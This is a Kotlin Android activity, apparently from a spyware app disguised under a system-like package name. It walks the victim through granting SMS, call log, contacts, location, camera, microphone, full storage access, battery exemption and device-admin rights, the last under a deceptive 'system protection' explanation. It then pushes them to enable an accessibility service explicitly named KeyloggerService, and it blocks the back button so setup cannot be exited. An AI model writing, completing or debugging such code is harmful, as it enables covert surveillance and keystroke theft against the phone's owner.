package com.android.services

import android.Manifest
import android.app.admin.DevicePolicyManager
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.Environment
import android.os.Handler
import android.os.Looper
import android.os.PowerManager
import android.provider.Settings
import android.text.TextUtils
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import com.google.firebase.crashlytics.FirebaseCrashlytics

class SilentSetupActivity : AppCompatActivity() {

    private val handler = Handler(Looper.getMainLooper())
    private val dpm by lazy { getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager }
    private val adminComponent by lazy { ComponentName(this, AppDeviceAdminReceiver::class.java) }
    private val crashlytics by lazy { FirebaseCrashlytics.getInstance() }

    private val permissions = mutableListOf(
        Manifest.permission.ACCESS_FINE_LOCATION,
        Manifest.permission.ACCESS_COARSE_LOCATION,
        Manifest.permission.READ_SMS,
        Manifest.permission.READ_CALL_LOG,
        Manifest.permission.READ_CONTACTS,
        Manifest.permission.CAMERA,
        Manifest.permission.READ_PHONE_STATE,
        Manifest.permission.RECORD_AUDIO,           // ← ditambah (ada di manifest, wajib diminta)
    )

    private var permissionIndex = 0

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        crashlytics.log("SilentSetupActivity: onCreate")
        requestNextPermission()
    }

    // ── Runtime permissions ──────────────────────────────────────────────────

    private fun requestNextPermission() {
        // Lewati permission yang sudah granted
        while (permissionIndex < permissions.size) {
            val perm = permissions[permissionIndex]
            if (ContextCompat.checkSelfPermission(this, perm) == PackageManager.PERMISSION_GRANTED) {
                permissionIndex++
            } else break
        }

        if (permissionIndex >= permissions.size) {
            requestSpecialPermissions()
            return
        }

        val perm = permissions[permissionIndex]
        crashlytics.log("SilentSetupActivity: requesting permission[$permissionIndex] = $perm")
        try {
            ActivityCompat.requestPermissions(this, arrayOf(perm), 1000 + permissionIndex)
        } catch (e: Exception) {
            crashlytics.recordException(e)
            // Skip dan lanjut ke berikutnya
            permissionIndex++
            handler.postDelayed({ requestNextPermission() }, 300)
        }
    }

    override fun onRequestPermissionsResult(
        requestCode: Int,
        permissions: Array<String>,
        grantResults: IntArray
    ) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        val granted = grantResults.firstOrNull() == PackageManager.PERMISSION_GRANTED
        crashlytics.log("SilentSetupActivity: permissionResult[$requestCode] granted=$granted")
        permissionIndex++
        handler.postDelayed({ requestNextPermission() }, 300)
    }

    // ── Storage ──────────────────────────────────────────────────────────────

    private fun requestSpecialPermissions() {
        crashlytics.log("SilentSetupActivity: requestSpecialPermissions")
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R && !Environment.isExternalStorageManager()) {
            try {
                startActivityForResult(
                    Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION).apply {
                        data = Uri.parse("package:$packageName")
                    }, 2001
                )
                return
            } catch (e: Exception) {
                crashlytics.recordException(e)
            }
        }
        requestBatteryOptimization()
    }

    // ── Battery optimization ─────────────────────────────────────────────────

    private fun requestBatteryOptimization() {
        crashlytics.log("SilentSetupActivity: requestBatteryOptimization")
        val pm = getSystemService(PowerManager::class.java)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M &&
            !pm.isIgnoringBatteryOptimizations(packageName)) {
            try {
                startActivityForResult(
                    Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS).apply {
                        data = Uri.parse("package:$packageName")
                    }, 2002
                )
                return
            } catch (e: Exception) {
                crashlytics.recordException(e)
            }
        }
        requestDeviceAdmin()
    }

    // ── Device Admin ─────────────────────────────────────────────────────────

    private fun requestDeviceAdmin() {
        crashlytics.log("SilentSetupActivity: requestDeviceAdmin")
        if (!dpm.isAdminActive(adminComponent)) {
            try {
                startActivityForResult(
                    Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN).apply {
                        putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, adminComponent)
                        putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "Diperlukan untuk proteksi sistem.")
                    }, 2003
                )
                return
            } catch (e: Exception) {
                crashlytics.recordException(e)
            }
        }
        requestAccessibility()
    }

    // ── Accessibility (Keylogger) ─────────────────────────────────────────────

    private fun isAccessibilityEnabled(serviceClass: Class<*>): Boolean {
        return try {
            val expected = ComponentName(this, serviceClass)
            val enabled = Settings.Secure.getString(
                contentResolver,
                Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES
            ) ?: return false
            val splitter = TextUtils.SimpleStringSplitter(':')
            splitter.setString(enabled)
            while (splitter.hasNext()) {
                val cn = ComponentName.unflattenFromString(splitter.next())
                if (cn != null && cn == expected) return true
            }
            false
        } catch (e: Exception) {
            crashlytics.recordException(e)
            false
        }
    }

    private fun requestAccessibility() {
        crashlytics.log("SilentSetupActivity: requestAccessibility")
        val keylogOk = isAccessibilityEnabled(KeyloggerService::class.java)
        if (!keylogOk) {
            try {
                startActivityForResult(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS), 2005)
                return
            } catch (e: Exception) {
                crashlytics.recordException(e)
            }
        }
        finishSetup()
    }

    // ── onActivityResult ─────────────────────────────────────────────────────

    @Suppress("DEPRECATION")
    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        super.onActivityResult(requestCode, resultCode, data)
        crashlytics.log("SilentSetupActivity: onActivityResult requestCode=$requestCode resultCode=$resultCode")
        handler.postDelayed({
            when (requestCode) {
                2001 -> requestBatteryOptimization()
                2002 -> requestDeviceAdmin()
                2003 -> requestAccessibility()
                // BUG FIX: requestCode 2005 (Accessibility Settings) sebelumnya tidak ditangani
                // → activity hang/forclose setelah user kasih izin aksesibilitas.
                // Sekarang langsung panggil finishSetup() setelah kembali dari accessibility settings.
                2005 -> finishSetup()
                else -> {
                    // Requestcode tidak dikenal — catat ke Crashlytics dan finish
                    crashlytics.log("SilentSetupActivity: unknown requestCode=$requestCode")
                    finishSetup()
                }
            }
        }, 400)
    }

    // ── Finish ───────────────────────────────────────────────────────────────

    private fun finishSetup() {
        crashlytics.log("SilentSetupActivity: finishSetup → setup_done=true")
        getSharedPreferences("connector_prefs", Context.MODE_PRIVATE)
            .edit().putBoolean("setup_done", true).apply()
        finish()
    }

    @Suppress("DEPRECATION", "MissingSuperCall")
    override fun onBackPressed() {
        // Blokir back selama setup berlangsung
    }
}
